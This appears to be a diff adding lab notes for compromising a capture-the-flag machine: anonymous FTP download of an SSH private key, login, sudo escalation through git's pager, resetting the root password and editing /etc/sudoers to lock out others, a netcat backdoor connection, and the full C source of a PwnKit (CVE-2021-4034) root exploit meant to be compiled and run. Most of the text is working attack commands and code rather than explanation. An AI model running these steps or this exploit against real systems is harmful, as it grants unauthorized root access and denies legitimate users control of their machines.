@@ -1,0 +1,123 @@
+###########  Speed Exploit  ###############
+tip=<target.ip>
+ftp $tip
+anonymous
+get id_rsa
+bye
+chmod 600 id_rsa
+ssh -i id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ashu@$tip
+
+# on target privesc
+sudo su skidy
+sudo git -p help config   # -p is less pager for help
+! 
+passwd                   #change the root password to pw of my choice
+nano /etc/sudoers        #Delete the user account entries to block access path
+[ctrl]+x
+y
+find / -type f \( -name "flag*.txt" -o -name "user.txt" -o -name "root.txt" \) -exec head -n +1 {} \; 2>/dev/null
+
+echo "ShannonZoch" > /root/king.txt     #Does this do anything?
+
+
+###########################################
+
+###########  Teaching slow and low  ###############
+
+tip=<target.ip>
+ping $tip         #Ensure connectivity
+#quick rust scan all ports followed by nmap -A does -sV -sC -0 --traceroute
+rustscan -a $tip -b 5000 -r 1-65535 -- -A -n -T4 --max-retries 1 --min-rate 1000 
+
+ftp $tip
+anonymous
+ls
+get flag.txt
+get id_rsa
+get authorized_keys
+get id_rsa.pub
+bye
+
+#Back on attack
+cat flag.txt    #submit ftp flag
+cat id_rsa
+cat authorized_keys
+cat id_rsa.pub
+
+chmod 600 id_rsa
+ssh -i id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ashu@$tip
+cd ..
+cd skidy
+ls -la
+cat flag.txt     #submit skidy's flag
+
+# List Sudo priveleges current user has
+sudo -l 
+
+# root nopasswd  /bin/su skidy  && /usr/bin/chattr    can run as root
+sudo su skidy       #switch from ashu to skidy
+
+sudo -l       #sudo privs for skidy   /usr/bin/git *, /usr/bin/chattr
+#Overly broad sudo grant (/usr/bin/git *) — allowing any git subcommand is dangerous, #since many subcommands (like help, or hooks, or -c core.pager=...) can spawn arbitrary #processes.
+
+firefox & disown    #spawn firefox and return to terminal prompt
+# in firefox   search gtfobins  for git
+sudo git -p help config   # -p is less pager for help
+!                     #inside less from the help command this drops into a root shell
+
+OR
+sudo git help config
+!/bin/sh    OR   !sh
+ 
+OR
+sudo git -c core.pager=/bin/sh log
+
+OR
+PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
+
+nano /etc/sudoers        #Delete the user account entries to block access path
+passwd                   #change the root password to pw of my choice
+#Find all flags on the machine
+find / -type f \( -name "flag*.txt" -o -name "user.txt" -o -name "root.txt" \) -exec head -n +1 {} \; 2>/dev/null
+
+#try to connect to skidys backdoor
+nc $tip 9001      
+password yourmom!
+cat flag.txt     gets us back to skidys account
+
+
+
+################Possibly vulnerable to CVE-2021-4034 (PwnKit)
+https://github.com/arthepsy/CVE-2021-4034/tree/main
+######    Copy below script to p.c   
+######    gcc p.c -o poc
+######    chmod +x poc
+######    ./poc
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+char *shell = 
+	"#include <stdio.h>\n"
+	"#include <stdlib.h>\n"
+	"#include <unistd.h>\n\n"
+	"void gconv() {}\n"
+	"void gconv_init() {\n"
+	"	setuid(0); setgid(0);\n"
+	"	seteuid(0); setegid(0);\n"
+	"	system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh\");\n"
+	"	exit(0);\n"
+	"}";
+
+int main(int argc, char *argv[]) {
+	FILE *fp;
+	system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");
+	system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");
+	fp = fopen("pwnkit/pwnkit.c", "w");
+	fprintf(fp, "%s", shell);
+	fclose(fp);
+	system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");
+	char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };
+	execve("/usr/bin/pkexec", (char*[]){NULL}, env);
+}
+####################################  End of Script #####################
